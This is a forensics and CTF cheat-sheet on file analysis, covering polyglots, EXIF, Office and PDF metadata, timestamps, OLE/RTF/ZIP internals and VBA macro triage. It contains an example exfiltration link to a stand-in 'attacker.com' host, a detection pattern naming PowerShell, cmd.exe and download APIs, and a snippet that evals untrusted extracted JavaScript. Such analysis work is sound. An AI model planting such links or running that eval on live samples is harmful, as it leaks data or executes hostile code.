### Polyglot Detection

Files valid as multiple formats simultaneously.

bash

```bash
# Check for multiple signatures
xxd file.bin | grep -E "ff d8 ff|89 50 4e 47|50 4b 03 04"

# Test with multiple tools
file file.bin
trid file.bin
binwalk file.bin

# Manual polyglot inspection
# Example: PDF + ZIP
head -c 1024 file.bin | strings | grep "%PDF"
tail -c 1024 file.bin | xxd | grep "50 4b"

# Extract embedded content
binwalk -e polyglot.bin
foremost -i polyglot.bin -o extracted
```

**Common CTF Polyglot Patterns:**

```
PDF + ZIP:     Prepend PDF structure, append ZIP with valid offsets
PNG + JAR:     PNG chunks + ZIP central directory
JPEG + RAR:    JPEG comment field contains RAR
GIF + JS:      GIF header with JavaScript in comment blocks
```

## EXIF Data Extraction

### Understanding EXIF

EXIF (Exchangeable Image File Format) stores metadata in JPEG, TIFF, WAV, and some RAW formats. Critical for:

- Geolocation (GPS coordinates)
- Device identification (camera make/model)
- Software versions
- Timestamps (creation, modification)
- Hidden data in comments/user fields

### Extraction Tools

**exiftool (Most Comprehensive)**

bash

```bash
# Basic extraction
exiftool image.jpg

# All metadata including unknown tags
exiftool -a -G1 -s image.jpg

# Specific tags
exiftool -GPSPosition -Make -Model image.jpg

# Extract GPS coordinates only
exiftool -gps:all image.jpg

# Convert GPS to decimal degrees
exiftool -n -gps:all image.jpg

# Batch processing with CSV output
exiftool -csv -r /evidence/images/ > metadata.csv

# Extract embedded thumbnails
exiftool -b -ThumbnailImage image.jpg > thumbnail.jpg
exiftool -b -PreviewImage image.jpg > preview.jpg

# Verbose output with hex values
exiftool -v3 image.jpg

# Find images by specific criteria
exiftool -if '$Make eq "Canon"' -filename -directory /photos

# Extract all user comments
exiftool -UserComment -r /suspect_images/
```

**exiv2 (Modification Capable)**

bash

```bash
# Read metadata
exiv2 -pa image.jpg

# Extract to separate file
exiv2 -ea image.jpg  # Creates image.exv

# Print structure
exiv2 -pS image.jpg

# Delete all metadata
exiv2 rm image.jpg

# Extract specific tag
exiv2 -g GPS image.jpg
```

**jhead (JPEG-Specific)**

bash

```bash
# Display EXIF data
jhead image.jpg

# Show timestamp info
jhead -v image.jpg

# Batch timestamp extraction
jhead *.jpg | grep "Date/Time"

# Extract EXIF section to binary
jhead -se image.jpg
```

### Forensic EXIF Analysis

**GPS Coordinate Extraction and Mapping**

bash

```bash
# Extract GPS with decimal conversion
exiftool -n -csv -GPSLatitude -GPSLongitude -filename images/*.jpg > gps_data.csv

# Format for Google Maps
exiftool -p '$GPSLatitude, $GPSLongitude' -n image.jpg

# Example output: 40.748817, -73.985428
# Open in browser: https://www.google.com/maps?q=40.748817,-73.985428

# Batch GPS extraction with error handling
find /evidence -iname "*.jpg" -exec exiftool -n -GPSPosition {} \; | grep GPSPosition
```

**Timeline Construction**

bash

```bash
# Extract all timestamps
exiftool -time:all -s image.jpg

# Important timestamp fields:
# - FileModifyDate: Filesystem modification
# - FileCreateDate: File creation (unreliable, filesystem-dependent)
# - CreateDate: Camera/software timestamp
# - DateTimeOriginal: Original capture time
# - ModifyDate: Last edit timestamp

# Generate timeline for directory
exiftool -csv -CreateDate -DateTimeOriginal -r /evidence/ | sort -t',' -k2

# Detect timestamp manipulation
exiftool -a -G1 -time:all image.jpg | grep -E "Create|Modify"
# [Inference] If CreateDate > ModifyDate, metadata likely tampered
```

**Software and Device Fingerprinting**

bash

```bash
# Extract device information
exiftool -Make -Model -LensModel -Software image.jpg

# Find all unique cameras in set
exiftool -Make -Model -csv images/*.jpg | sort -u

# Detect editing software
exiftool -Software -HistorySoftwareAgent -Creator image.jpg

# Check for manipulation indicators
exiftool -Warning image.jpg  # Detects corrupted/modified EXIF
```

**Hidden Data in User Fields**

bash

```bash
# Extract comment fields
exiftool -Comment -UserComment -ImageDescription image.jpg

# Base64 in comments (common CTF technique)
exiftool -b -Comment image.jpg | base64 -d

# Check for unusually large metadata
exiftool -s -n -MakerNotes image.jpg > makernotes.bin
file makernotes.bin  # May contain hidden files

# Extract XMP metadata (XML-based)
exiftool -xmp:all image.jpg

# Check for embedded copyright/contact info
exiftool -Copyright -Artist -Credit image.jpg
```

**Thumbnail Extraction for Deleted Content**

bash

```bash
# Extract embedded thumbnail (may differ from main image)
exiftool -b -ThumbnailImage original.jpg > thumb.jpg

# Compare hashes
md5sum original.jpg thumb.jpg

# [Inference] Thumbnail from earlier version if image was edited

# Extract preview images (RAW formats)
exiftool -b -PreviewImage image.CR2 > preview.jpg
```

### EXIF Anomaly Detection

bash

```bash
# Script: detect_exif_anomalies.sh
#!/bin/bash

for img in *.jpg; do
    echo "Analyzing: $img"
    
    # Extract key timestamps
    create=$(exiftool -s -s -s -CreateDate "$img")
    modify=$(exiftool -s -s -s -ModifyDate "$img")
    file_mod=$(exiftool -s -s -s -FileModifyDate "$img")
    
    # Check for suspicious patterns
    if [ -z "$create" ] || [ -z "$modify" ]; then
        echo "  [SUSPICIOUS] Missing creation/modification timestamps"
    fi
    
    # GPS without camera make (web-generated image)
    gps=$(exiftool -s -s -s -GPSLatitude "$img")
    make=$(exiftool -s -s -s -Make "$img")
    if [ ! -z "$gps" ] && [ -z "$make" ]; then
        echo "  [SUSPICIOUS] GPS data without camera information"
    fi
    
    # Check for editing software
    software=$(exiftool -s -s -s -Software "$img")
    if echo "$software" | grep -qi "photoshop\|gimp\|paint"; then
        echo "  [INFO] Edited with: $software"
    fi
    
    echo
done
```

## Document Metadata Analysis

### Office Document Metadata (Legacy OLE Format)

**olevba (VBA Macro Analysis)**

bash

```bash
# Scan for macros
olevba document.doc

# Extract and decode macros
olevba -c document.xlsm

# Analyze all files in directory
olevba /evidence/*.doc --json > results.json

# Detect auto-execute macros
olevba -a document.pptm

# Deobfuscate suspicious code
olevba --deobf malicious.xlsm
```

**oleid (OLE Identification)**

bash

```bash
# Check file type and detect anomalies
oleid document.doc

# Indicators checked:
# - Encrypted
# - Contains macros
# - Contains Flash objects
# - Unusual directory structure
```

**oledump.py (Stream Analysis)**

bash

```bash
# List all OLE streams
oledump.py document.xls

# Extract specific stream (e.g., stream 8 with macros)
oledump.py -s 8 -v document.xls

# Dump all streams to files
oledump.py -D document.doc

# Select VBA streams only
oledump.py -M document.doc
```

**olemeta (Metadata Extraction)**

bash

```bash
# Extract document metadata
olemeta document.doc

# Metadata fields:
# - Author, Last Modified By
# - Company, Manager
# - Creation/Modification timestamps
# - Revision number
# - Total edit time
```

### Office Open XML (2007+) Analysis

OOXML documents are ZIP archives containing XML files.

bash

```bash
# Verify ZIP structure
unzip -l document.docx

# Extract for analysis
unzip document.docx -d extracted_docx/

# Key files:
# [Content_Types].xml - MIME types
# _rels/.rels - Relationships
# docProps/core.xml - Core metadata
# docProps/app.xml - Application metadata
# word/document.xml - Main content (docx)
# xl/workbook.xml - Workbook data (xlsx)

# Extract core metadata
unzip -p document.docx docProps/core.xml | xmllint --format -

# Parse creator information
unzip -p document.docx docProps/core.xml | grep -oP '(?<=<dc:creator>)[^<]+'

# Extract modification history
unzip -p document.docx docProps/app.xml | grep -oP '(?<=<Application>)[^<]+'

# Find hidden content
grep -r "hidden\|personal\|confidential" extracted_docx/
```

**Document Metadata Fields:**

xml

```xml
<!-- docProps/core.xml -->
<dc:creator>Username</dc:creator>
<cp:lastModifiedBy>Another User</cp:lastModifiedBy>
<dcterms:created>2024-01-15T10:30:00Z</dcterms:created>
<dcterms:modified>2024-01-20T14:22:00Z</dcterms:modified>
<cp:revision>5</cp:revision>

<!-- docProps/app.xml -->
<Application>Microsoft Office Word</Application>
<Company>Organization Name</Company>
<Manager>Supervisor Name</Manager>
<HyperlinkBase>file:///C:/Users/username/Documents/</HyperlinkBase>
```

**Track Changes Recovery**

bash

```bash
# Extract document body
unzip -p document.docx word/document.xml > body.xml

# Search for revision tags
grep -E "<w:del|<w:ins" body.xml

# Deleted text: <w:del> tags
# Inserted text: <w:ins> tags
# Format with xmllint
xmllint --format body.xml | grep -A5 -B5 "w:del"
```

**Hidden Data Extraction**

bash

```bash
# Check for alternate content
find extracted_docx/ -name "*.xml" -exec grep -l "hidden\|personal" {} \;

# Extract embedded media
ls extracted_docx/word/media/
file extracted_docx/word/media/*

# Check for external relationships (potential data exfiltration)
grep -r "TargetMode=\"External\"" extracted_docx/_rels/

# Extract comments
unzip -p document.docx word/comments.xml | xmllint --format -

# Extract footnotes/endnotes
unzip -p document.docx word/footnotes.xml | xmllint --format -
```

### PDF Metadata Analysis

bash

```bash
# Basic metadata with pdfinfo
pdfinfo document.pdf

# Detailed metadata with exiftool
exiftool document.pdf

# Extract XMP metadata
exiftool -xmp:all -b document.pdf

# Key PDF metadata fields:
# - Author, Creator, Producer
# - Creation/Modification dates
# - PDF version
# - Encryption status
# - JavaScript presence

# Check for embedded files
pdfinfo -meta document.pdf | grep -i "attach\|embed"

# Extract creation tool information
exiftool -Creator -Producer document.pdf
# [Inference] Producer field reveals PDF generation software/library
```

### Custom Metadata Extraction Script

python

```python
#!/usr/bin/env python3
# extract_doc_metadata.py

import sys
import zipfile
import xml.etree.ElementTree as ET
from pathlib import Path

def extract_ooxml_metadata(filepath):
    """Extract metadata from OOXML documents (docx, xlsx, pptx)"""
    
    namespaces = {
        'cp': 'http://schemas.openxmlformats.org/package/2006/metadata/core-properties',
        'dc': 'http://purl.org/dc/elements/1.1/',
        'dcterms': 'http://purl.org/dc/terms/',
        'xsi': 'http://www.w3.org/2001/XMLSchema-instance'
    }
    
    try:
        with zipfile.ZipFile(filepath, 'r') as zf:
            # Core properties
            core_xml = zf.read('docProps/core.xml')
            core_root = ET.fromstring(core_xml)
            
            metadata = {}
            
            # Extract common fields
            for elem, key in [
                ('dc:creator', 'Creator'),
                ('cp:lastModifiedBy', 'Last Modified By'),
                ('dcterms:created', 'Created'),
                ('dcterms:modified', 'Modified'),
                ('cp:revision', 'Revision')
            ]:
                node = core_root.find(elem, namespaces)
                if node is not None:
                    metadata[key] = node.text if node.text else ""
            
            # Application properties
            try:
                app_xml = zf.read('docProps/app.xml')
                app_root = ET.fromstring(app_xml)
                
                for elem in ['Application', 'Company', 'Manager']:
                    node = app_root.find(f'.//{elem}')
                    if node is not None and node.text:
                        metadata[elem] = node.text
            except KeyError:
                pass
            
            return metadata
            
    except Exception as e:
        return {'Error': str(e)}

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: extract_doc_metadata.py <document>")
        sys.exit(1)
    
    filepath = sys.argv[1]
    metadata = extract_ooxml_metadata(filepath)
    
    print(f"Metadata for: {filepath}\n")
    for key, value in metadata.items():
        print(f"{key:20s}: {value}")
```

## File Timestamp Analysis (MAC Times)

### Understanding Timestamp Types

**UNIX/Linux (ext4):**

- **mtime** (Modification): File content changed
- **atime** (Access): File read/opened
- **ctime** (Change): Inode metadata changed (permissions, ownership)
- **crtime** (Birth/Creation): File created (ext4, requires debugfs)

**Windows (NTFS):**

- **$STANDARD_INFORMATION**: Modified, Accessed, Changed, Created
- **$FILE_NAME**: Secondary set (4 timestamps) - often more reliable
- [Inference] $STANDARD_INFORMATION timestamps can be modified by users; $FILE_NAME requires kernel-level access

**Challenges:**

- Timezone offsets
- Clock skew/manipulation
- Filesystem-dependent precision
- Anti-forensics (timestamp stomping)

### Timestamp Extraction

**stat Command (Linux)**

bash

```bash
# Display all timestamps
stat file.txt

# Parsed output:
#   Access: 2024-10-12 14:23:45.123456789 +0800
#   Modify: 2024-10-11 09:15:22.987654321 +0800
#   Change: 2024-10-11 09:15:22.987654321 +0800
#    Birth: 2024-10-10 08:00:00.000000000 +0800

# Scripting-friendly format
stat -c "%n|%y|%x|%z" file.txt
# Format: filename|mtime|atime|ctime

# Batch timestamp extraction
find /evidence -type f -exec stat -c "%n|%y|%x|%z" {} \; > timestamps.csv
```

**debugfs (ext Filesystems - Birth Time)**

bash

```bash
# Access birth time (crtime)
debugfs -R 'stat <inode>' /dev/sdb1

# Find inode number
ls -i file.txt

# Example workflow
inode=$(ls -i file.txt | awk '{print $1}')
debugfs -R "stat <$inode>" /dev/sdb1 | grep crtime
```

**SleuthKit Tools (Cross-Platform)**

bash

```bash
# List files with MAC times
fls -m / -r -p image.dd > bodyfile.txt

# Display specific file timestamps
istat image.dd <inode>

# Timeline generation (mactime)
mactime -b bodyfile.txt -d > timeline.csv

# Filter timeline by date range
mactime -b bodyfile.txt -d 2024-10-01..2024-10-15 > filtered_timeline.csv
```

**Windows NTFS Timestamp Analysis**

bash

```bash
# Using istat on NTFS image
istat ntfs.dd <MFT_entry>

# Output shows both $STANDARD_INFORMATION and $FILE_NAME timestamps

# Extract using analyzeMFT
analyzeMFT.py -f extracted_mft.bin -o mft_analysis.csv

# Compare $SI vs $FILENAME timestamps
awk -F',' '{if ($10 != $14) print $0}' mft_analysis.csv
# [Inference] Discrepancies indicate timestamp manipulation
```

### Timestamp Anomaly Detection

**Temporal Inconsistencies**

bash

```bash
# Detect files with impossible timestamp sequences
find /evidence -type f | while read f; do
    mtime=$(stat -c %Y "$f")
    ctime=$(stat -c %Z "$f")
    
    # ctime should always be >= mtime
    if [ $ctime -lt $mtime ]; then
        echo "ANOMALY: $f (ctime < mtime)"
    fi
done

# Files modified after system compromise timestamp
compromise_time="2024-10-01 14:30:00"
compromise_epoch=$(date -d "$compromise_time" +%s)

find /evidence -type f -newermt "$compromise_time" -ls
```

**Timestamp Stomping Detection**

bash

```bash
# Check for files with identical MAC times (suspicious)
stat -c "%n %Y %X %Z" * | awk '{if ($2 == $3 && $3 == $4) print $0}'

# Compare $STANDARD_INFORMATION vs $FILE_NAME (NTFS)
# Requires MFT parsing - use analyzeMFT output
awk -F',' '{
    si_mod = $10
    fn_mod = $14
    if (si_mod != fn_mod) {
        print $2, si_mod, fn_mod
    }
}' mft_analysis.csv
```

**Timeline Analysis Script**

python

```python
#!/usr/bin/env python3
# timeline_analysis.py

import os
import sys
from datetime import datetime

def analyze_timestamps(directory):
    """Detect timestamp anomalies in directory"""
    
    anomalies = []
    
    for root, dirs, files in os.walk(directory):
        for filename in files:
            filepath = os.path.join(root, filename)
            try:
                stat_info = os.stat(filepath)
                
                mtime = stat_info.st_mtime
                atime = stat_info.st_atime
                ctime = stat_info.st_ctime
                
                # Check for anomalies
                
                # 1. ctime < mtime (impossible)
                if ctime < mtime:
                    anomalies.append({
                        'file': filepath,
                        'type': 'ctime < mtime',
                        'mtime': datetime.fromtimestamp(mtime),
                        'ctime': datetime.fromtimestamp(ctime)
                    })
                
                # 2. All timestamps identical (potential stomping)
                if mtime == atime == ctime:
                    anomalies.append({
                        'file': filepath,
                        'type': 'All timestamps identical',
                        'timestamp': datetime.fromtimestamp(mtime)
                    })
                
                # 3. Future timestamps
                now = datetime.now().timestamp()
                if mtime > now or ctime > now:
                    anomalies.append({
                        'file': filepath,
                        'type': 'Future timestamp',
                        'mtime': datetime.fromtimestamp(mtime)
                    })
                    
            except (OSError, PermissionError):
                continue
    
    return anomalies

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: timeline_analysis.py <directory>")
        sys.exit(1)
    
    anomalies = analyze_timestamps(sys.argv[1])
    
    print(f"Found {len(anomalies)} anomalies:\n")
    for a in anomalies:
        print(f"Type: {a['type']}")
        print(f"File: {a['file']}")
        for k, v in a.items():
            if k not in ['type', 'file']:
                print(f"  {k}: {v}")
        print()
```

### CTF Timestamp Analysis

bash

```bash
# Common CTF scenarios:

# 1. Find files created in specific timeframe
find /evidence -type f -newermt "2024-10-01 00:00:00" ! -newermt "2024-10-02 00:00:00"

# 2. Oldest/newest files
find /evidence -type f -printf '%T+ %p\n' | sort | head -5  # Oldest
find /evidence -type f -printf '%T+ %p\n' | sort | tail -5  # Newest

# 3. Files with specific modification time
find /evidence -type f -mtime 7  # Exactly 7 days ago

# 4. Extract embedded timestamps from filenames
# Example: backup_20241012_143045.tar.gz
for f in backup_*.tar.gz; do
    timestamp=$(echo "$f" | grep -oP '\d{8}_\d{6}')
    echo "$f: $timestamp"
done
```

## File Type Verification vs Extension

### Extension vs Content Mismatch Detection

bash

```bash
# Automated mismatch detection script
#!/bin/bash
# file_type_verify.sh

for file in "$@"; do
    extension="${file##*.}"
    mime_type=$(file -b --mime-type "$file")
    
    # Define expected MIME types for common extensions
    case "$extension" in
        jpg|jpeg)
            expected="image/jpeg"
            ;;
        png)
            expected="image/png"
            ;;
        pdf)
            expected="application/pdf"
            ;;
        zip)
            expected="application/zip"
            ;;
        exe)
            expected="application/x-dosexec"
            ;;
        txt)
            expected="text/plain"
            ;;
        *)
            expected="unknown"
            ;;
    esac
    
    if [ "$expected" != "unknown" ] && [ "$mime_type" != "$expected" ]; then
        echo "[MISMATCH] $file"
        echo "  Extension: .$extension (expects $expected)"
        echo "  Actual:    $mime_type"
    fi
done
```

**Bulk Verification with find**

bash

```bash
# Check all .txt files for non-text content
find /evidence -name "*.txt" -exec sh -c '
    mime=$(file -b --mime-type "$1")
    if [ "$mime" != "text/plain" ]; then
        echo "$1: $mime"
    fi
' _ {} \;

# Find executables with document extensions
find /evidence -regex ".*\.\(doc\|pdf\|jpg\)" -exec sh -c '
    if file "$1" | grep -q "executable"; then
        echo "EXECUTABLE: $1"
    fi
' _ {} \;
```

### Double Extension Analysis

bash

```bash
# Find potential double-extension files
find /evidence -name "*.*.*"

# Extract and analyze
find /evidence -name "*.*.*" | while read f; do
    first_ext=$(echo "$f" | rev | cut -d'.' -f2 | rev)
    second_ext=$(echo "$f" | rev | cut -d'.' -f1 | rev)
    
    echo "File: $f"
    echo "  Extensions: .$first_ext .$second_ext"
    echo "  True type: $(file -b "$f")"
    echo
done

# Common malicious patterns:
# document.pdf.exe
# image.jpg.scr
# invoice.doc.js
```

## Compound File Formats

### Understanding Compound Files

Compound file formats contain multiple embedded objects or follow complex internal structures. Understanding these is critical for complete forensic analysis.

### OLE2 (Object Linking and Embedding)

Legacy Microsoft Office formats (.doc, .xls, .ppt) use OLE2 Compound File Binary Format.

**Structure:**
- Header (512 bytes)
- FAT (File Allocation Table)
- Directory entries
- Data streams

**Analysis with oledump.py**
```bash
# List all streams
oledump.py document.doc

# Output example:
#   1:       114 '\x01CompObj'
#   2:      4096 '\x05DocumentSummaryInformation'
#   3:      4096 '\x05SummaryInformation'
#   4:      7119 '1Table'
#   5:    461432 'Data'
#   6:       553 'Macros/PROJECT'
#   7:        71 'Macros/PROJECTwm'
#   8: M    1257 'Macros/VBA/Module1'  # M = Macro detected
#   9:      3003 'Macros/VBA/_VBA_PROJECT'
#  10:       567 'Macros/VBA/dir'

# Extract specific stream
oledump.py -s 8 document.doc > module1.vba

# Dump stream in hex
oledump.py -s 5 -x document.doc | xxd

# Decompress VBA streams
oledump.py -s 8 -v document.doc
```

**Stream Extraction Script**
```bash
#!/bin/bash
# extract_ole_streams.sh

doc_file="$1"
output_dir="ole_extracted"

mkdir -p "$output_dir"

# Get stream count
stream_count=$(oledump.py "$doc_file" | wc -l)

echo "Extracting $stream_count streams from $doc_file"

# Extract each stream
for i in $(seq 1 $stream_count); do
    stream_name=$(oledump.py "$doc_file" | sed -n "${i}p" | awk '{print $NF}')
    stream_name_clean=$(echo "$stream_name" | tr '/' '_' | tr -d "'")
    
    oledump.py -s $i -d "$doc_file" > "$output_dir/stream_${i}_${stream_name_clean}.bin"
    
    # Identify content
    file_type=$(file -b "$output_dir/stream_${i}_${stream_name_clean}.bin")
    echo "Stream $i ($stream_name): $file_type"
done
```

**oletools Suite**
```bash
# Check for malicious indicators
oleid suspicious.doc

# Extract and analyze macros
olevba -a suspicious.xlsm

# Decode obfuscated VBA
olevba --deobf --decode suspicious.doc

# Extract metadata
olemeta document.doc

# Reconstruct OLE directory tree
oledir document.xls

# Parse OLE structure
olemap document.ppt
```

### RTF (Rich Text Format)

RTF is text-based but can embed OLE objects and binary data.

**Structure Analysis**
```bash
# RTF files are plain text with embedded hex
strings document.rtf | head -20

# Check for embedded objects
grep -a "\\object" document.rtf

# Extract OLE objects (hex-encoded)
grep -oP '\\objdata\s+\K[0-9a-fA-F]+' document.rtf > embedded_hex.txt

# Convert hex to binary
xxd -r -p embedded_hex.txt > embedded_object.bin
file embedded_object.bin
```

**rtfobj (Automated Extraction)**
```bash
# Install from oletools
pip install oletools

# Extract embedded objects
rtfobj document.rtf

# List objects without extraction
rtfobj -l document.rtf

# Save objects to directory
rtfobj -s objects_dir document.rtf
```

**RTF Exploit Detection**
```bash
# Check for CVE-2017-11882 (Equation Editor)
grep -a "Equation.3" document.rtf

# Look for suspicious control words
grep -oE '\\[a-z]+' document.rtf | sort -u | grep -E "objdata|objclass|objhtml"

# Extract shellcode patterns
strings -a document.rtf | grep -E "\\x[0-9a-fA-F]{2}" | head -20
```

### ZIP-Based Formats

Many modern formats are ZIP archives with specific internal structure.

**Formats:**
- Office Open XML: .docx, .xlsx, .pptx
- OpenDocument: .odt, .ods, .odp
- Java Archives: .jar, .war, .ear
- Android: .apk
- eBooks: .epub
- 3D models: .3mf

**Verification and Analysis**
```bash
# Verify ZIP structure
unzip -t document.docx

# List contents with details
unzip -l document.docx

# Extract to directory
unzip document.docx -d extracted/

# Check for specific required files (OOXML)
unzip -l document.docx | grep -E "\[Content_Types\]\.xml|_rels/.rels"

# [Inference] Missing required files indicates corruption or non-standard creation
```

**Detecting Hidden Content in ZIP-based Files**
```bash
# Extract and search all XML content
unzip -q document.docx -d temp_docx/
grep -r "password\|confidential\|secret" temp_docx/ --color

# Find extra files not part of standard structure
find temp_docx/ -type f | grep -v -E "\.xml$|\.rels$|\.jpg$|\.png$"

# Check for alternate content streams
grep -r "AlternateContent" temp_docx/

# Look for external references
grep -r "TargetMode=\"External\"" temp_docx/_rels/
```

**APK Analysis**
```bash
# Extract APK (Android Package)
unzip application.apk -d apk_contents/

# Key files:
# AndroidManifest.xml - App permissions, components
# classes.dex - Compiled Dalvik bytecode
# resources.arsc - Resource table
# META-INF/CERT.RSA - Certificate

# Decode AndroidManifest
apktool d application.apk -o decoded_apk/

# Convert DEX to JAR
d2j-dex2jar classes.dex -o classes.jar

# Decompile Java classes
jadx -d decompiled/ classes.dex
```

### Embedded File Detection

```bash
# Binwalk - automated embedded file scanner
binwalk suspicious.bin

# Extract all embedded files
binwalk -e suspicious.bin

# Detailed entropy analysis
binwalk -E suspicious.bin

# Custom signature search
binwalk --signature custom_sigs.txt suspicious.bin

# [Inference] Entropy spikes indicate compression/encryption
```

**Manual Embedded File Search**
```bash
# Search for multiple file signatures
grep -obUaP "\xFF\xD8\xFF|\x89PNG|\x50\x4B\x03\x04" file.bin

# Output: byte_offset:signature
# Extract based on offsets:
dd if=file.bin of=embedded.jpg bs=1 skip=<offset> count=<size>
```

## PDF Structure Analysis

### PDF Internal Structure

**Basic Components:**
- Header: `%PDF-1.x`
- Body: Objects (numbered)
- Cross-reference table (xref)
- Trailer: Points to xref, contains root catalog
- Incremental updates (appended)

**Object Types:**
- Boolean, Integer, Real, String, Name
- Array: `[1 2 3]`
- Dictionary: `<< /Type /Page >>`
- Stream: Dictionary + binary data
- Null object

### PDF Analysis Tools

**pdfid.py (Quick Triage)**
```bash
# Identify PDF characteristics
pdfid.py document.pdf

# Output shows:
# /JS, /JavaScript - JavaScript code
# /AA, /OpenAction - Auto-execute actions
# /Launch - Execute external programs
# /EmbeddedFile - Attached files
# /ObjStm - Object streams (can hide content)
# /XFA - XML Forms Architecture

# Scan directory
pdfid.py -a /evidence/pdfs/ > pdf_analysis.txt
```

**pdf-parser.py (Deep Inspection)**
```bash
# List all objects
pdf-parser.py document.pdf

# Search for specific object type
pdf-parser.py --search javascript document.pdf

# Extract object by reference
pdf-parser.py --object 15 document.pdf

# Extract stream content
pdf-parser.py --object 15 --filter --raw document.pdf > stream15.bin

# Find objects with /JS or /JavaScript
pdf-parser.py --search "/JS" document.pdf
pdf-parser.py --search "/JavaScript" document.pdf

# Look for auto-execute actions
pdf-parser.py --search "/OpenAction" document.pdf
pdf-parser.py --search "/AA" document.pdf
```

**peepdf (Interactive Analysis)**
```bash
# Interactive mode
peepdf -i suspicious.pdf

# Commands within peepdf:
# info - Show document info
# tree - Display object tree
# object <num> - Show specific object
# stream <num> - Extract stream
# js_code - Show all JavaScript
# extract js > output.js - Extract JavaScript to file
# metadata - Display XMP metadata
# errors - Show parsing errors

# Non-interactive scanning
peepdf -f suspicious.pdf
```

**qpdf (Manipulation and Inspection)**
```bash
# Check PDF structure
qpdf --check document.pdf

# Linearize and decrypt
qpdf --decrypt encrypted.pdf decrypted.pdf

# Extract attachments
qpdf --show-attachment document.pdf

# Uncompress streams for analysis
qpdf --qdf --object-streams=disable document.pdf uncompressed.pdf

# Show xref table
qpdf --show-xref document.pdf
```

### JavaScript Extraction from PDFs

```bash
# Extract all JavaScript using pdf-parser
pdf-parser.py --search javascript document.pdf | grep -A 50 "/JS"

# Automated extraction script
#!/bin/bash
pdf_file="$1"

# Find JavaScript objects
js_objects=$(pdf-parser.py "$pdf_file" | grep -B2 "/JavaScript" | grep "^obj" | awk '{print $2}')

echo "Found JavaScript in objects: $js_objects"

for obj in $js_objects; do
    echo "=== Object $obj ==="
    pdf-parser.py --object $obj --filter --raw "$pdf_file" | strings
    echo
done
```

**Deobfuscating PDF JavaScript**
```bash
# Extract JavaScript
pdf-parser.py --object 42 --filter --raw malicious.pdf > extracted.js

# Common obfuscation patterns:
# - eval(unescape(...))
# - String.fromCharCode()
# - Hex encoding

# Basic deobfuscation
node << 'EOF'
const fs = require('fs');
const code = fs.readFileSync('extracted.js', 'utf8');

// Replace eval with console.log to see decoded content
const modified = code.replace(/eval\(/g, 'console.log(');
eval(modified);
EOF
```

### Embedded File Extraction

```bash
# List attachments with pdfdetach
pdfdetach -list document.pdf

# Extract all attachments
pdfdetach -saveall -o attachments_dir document.pdf

# Extract specific attachment
pdfdetach -save 1 -o extracted_file.bin document.pdf

# Using pdf-parser for embedded streams
pdf-parser.py --search "/EmbeddedFile" document.pdf

# Extract the referenced stream
pdf-parser.py --object <stream_num> --filter --raw document.pdf > embedded.bin
```

### PDF Metadata Analysis

```bash
# Basic metadata
pdfinfo document.pdf

# Full metadata including XMP
exiftool document.pdf

# Extract XMP metadata (XML)
exiftool -xmp -b document.pdf > metadata.xmp
xmllint --format metadata.xmp

# Key metadata fields:
# - Producer: PDF creation software
# - Creator: Original application
# - CreationDate, ModDate
# - Author, Title, Subject, Keywords

# Check for metadata manipulation
pdfinfo document.pdf | grep -E "CreationDate|ModDate"
# [Inference] ModDate before CreationDate indicates manipulation
```

### PDF Exploit Analysis

**Common Vulnerabilities:**
- CVE-2010-0188: libtiff integer overflow
- CVE-2009-0927: JBIG2 buffer overflow
- CVE-2013-2729: Buffer overflow in JavaScript engine

```bash
# Scan with YARA rules for PDF exploits
yara -r pdf_exploits.yar suspicious.pdf

# Check PDF version (older = more vulnerable)
head -1 document.pdf
# %PDF-1.4 or lower often targeted

# Look for suspicious streams
pdf-parser.py document.pdf | grep -E "/Filter|/Length" | sort -u

# Common exploit filters:
# /FlateDecode - Compression (can hide shellcode)
# /JBIG2Decode - JBIG2 (CVE-2009-0927)
# /CCITTFaxDecode - TIFF (CVE-2010-0188)

# Extract and analyze suspicious streams
pdf-parser.py --search "/JBIG2Decode" document.pdf
```

### Polyglot PDF Detection

```bash
# PDFs with multiple valid interpretations
# Check for other signatures at start
xxd document.pdf | head -20

# Common polyglots:
# PDF + ZIP: Contains ZIP signature after PDF content
# PDF + JPEG: Valid as both formats

# Test as multiple formats
file document.pdf
unzip -t document.pdf 2>&1 | grep -v "error"

# Extract secondary format
binwalk -e document.pdf
```

## Office Document Internals

### OOXML Structure Deep Dive

**Content Types (`[Content_Types].xml`)**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>
```

**Analyzing Relationships**
```bash
# Extract and examine relationships
unzip -p document.docx _rels/.rels | xmllint --format -

# Document-level relationships
unzip -p document.docx word/_rels/document.xml.rels | xmllint --format -

# External relationships (potential exfiltration)
unzip -p document.docx word/_rels/document.xml.rels | grep 'TargetMode="External"'

# Example external link:
# <Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://attacker.com/steal?data=..." TargetMode="External"/>
```

### VBA Macro Analysis (Legacy and OOXML)

**Macro Storage Locations:**
- Legacy (.doc, .xls): OLE streams (`Macros/VBA/`)
- OOXML (.docm, .xlsm): `word/vbaProject.bin` or `xl/vbaProject.bin`

**Extraction**
```bash
# OOXML macro extraction
unzip document.docm word/vbaProject.bin

# Analyze with olevba
olevba word/vbaProject.bin

# Extract macros from legacy format
olevba document.doc

# Look for auto-execute functions
olevba document.xlsm | grep -E "AutoOpen|Auto_Open|Workbook_Open|Document_Open"

# Suspicious API calls
olevba document.docm | grep -iE "CreateObject|WScript.Shell|powershell|cmd.exe|URLDownloadToFile"
```

**Deobfuscation Techniques**
```bash
# Extract with character analysis
olevba --decode suspicious.xlsm

# Common obfuscation patterns:
# - Chr(65) & Chr(66) = "AB"
# - StrReverse("llehs")  = "shell"
# - Base64 encoded strings
# - Variable name substitution

# Manual deobfuscation example
olevba -c malicious.doc | grep "Chr(" | \
    sed 's/Chr(\([0-9]*\))/\1/g' | \
    awk '{for(i=1;i<=NF;i++) if($i ~ /^[0-9]+$/) printf "%c", $i}'
```

**VBA Stomping Detection**
```bash
# VBA stomping: Removing source code but keeping p-code
# pcodedmp can extract p-code

pcodedmp.py vbaProject.bin

# [Inference] If pcodedmp shows code but olevba doesn't, VBA stomping likely occurred

# Compare source code presence
